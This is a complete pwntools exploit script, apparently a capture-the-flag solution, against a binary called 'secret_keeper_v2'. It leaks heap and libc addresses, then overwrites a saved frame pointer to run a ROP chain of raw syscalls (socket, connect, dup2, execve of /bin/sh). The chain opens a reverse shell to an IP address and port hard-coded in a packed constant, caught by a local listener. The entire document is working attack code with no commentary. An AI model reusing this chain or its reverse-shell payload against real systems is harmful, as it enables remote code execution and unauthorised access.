from pwn import *

context.arch = 'amd64'

###Util
def create(size,data):
    r.send('1aaa')
    r.send(str(size).ljust(4,'a'))
    r.send(data.ljust(size,b'\x00'))
    r.send('4aaa')
    r.send('M30W')

def show():
    r.send('2aaa')
    r.recvuntil('You asked for secret of ')
    r.recv(0x258)
    tcache_addr = u64(r.recv(8))
    r.recv(0x10)
    unsorted_bin_addr = u64(r.recv(8))
    r.recvuntil('Peeking at secrets is not good\n')
    return tcache_addr,unsorted_bin_addr

def delete():
    r.send('3aaa')

def spill():
    r.send('4aaa')

###Addr
#  libc2.29
main_arena_offset = 0x1bcaa0
unsorted_bin_offset = main_arena_offset+0x60
environ_offset = 0x1bfbc0
bin_sh_offset = 0x186cee

###ROPgadget
L_pop_rdi = 0x268a2
L_pop_rsi = 0x26dc9
L_pop_rdx = 0x2e1ba
L_pop_rax = 0x3d780
L_pop_rcx = 0xe32de #pop rcx ; pop rbx ; ret
L_dereference = 0x11c59c # mov rax, qword ptr [rax] ; ret
L_extract_rax = 0x1362b2 #mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
L_set_rax_val = 0x32d67 #mov qword ptr [rax], rdx ; ret
L_nop = 0x3124f
L_syscall = 0xb8ac9

###Exploit
r = process('./secret_keeper_v2')
l = listen(10101)

create(0x418,b'')
delete()
tcache_addr,unsorted_bin_addr = show()
heap_addr = tcache_addr-0x10
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(heap_addr))
print(hex(libc_base))


ROPsock  = p64(libc_base+L_pop_rdi)+p64(2)
ROPsock += p64(libc_base+L_pop_rsi)+p64(1)
ROPsock += p64(libc_base+L_pop_rdx)+p64(0)
ROPsock += p64(libc_base+L_pop_rax)+p64(41)
ROPsock += p64(libc_base+L_syscall)

ROPconn  = p64(libc_base+L_pop_rdi)+p64(0)
ROPconn += p64(libc_base+L_pop_rax)+p64(libc_base+environ_offset)
ROPconn += p64(libc_base+L_dereference)
ROPconn += p64(libc_base+L_pop_rdx)+p64(0x221e708c75270002)+p64(libc_base+L_set_rax_val)
ROPconn += p64(libc_base+L_pop_rcx)+p64(0)+p64(0)+p64(libc_base+L_extract_rax)
ROPconn += p64(libc_base+L_pop_rdx)+p64(16)
ROPconn += p64(libc_base+L_pop_rax)+p64(42)
ROPconn += p64(libc_base+L_syscall)

ROPdup2  = p64(libc_base+L_pop_rsi)+p64(1)
ROPdup2 += p64(libc_base+L_pop_rax)+p64(33)
ROPdup2 += p64(libc_base+L_syscall)

ROPexec  = p64(libc_base+L_pop_rdi)+p64(libc_base+bin_sh_offset)
ROPexec += p64(libc_base+L_pop_rsi)+p64(0)
ROPexec += p64(libc_base+L_pop_rdx)+p64(0)
ROPexec += p64(libc_base+L_pop_rax)+p64(59)
ROPexec += p64(libc_base+L_syscall)

ROPchain = ROPsock+ROPconn+ROPdup2+ROPexec
padding = p64(libc_base+L_nop)*((0x2700-len(ROPchain)-0xd8)//8)
partial_modify_rbp = b'\x00\x00'
payload = (padding+ROPchain).ljust(0x2700,b'\x00')+partial_modify_rbp
create(0x2702,payload)
spill()
l.interactive()
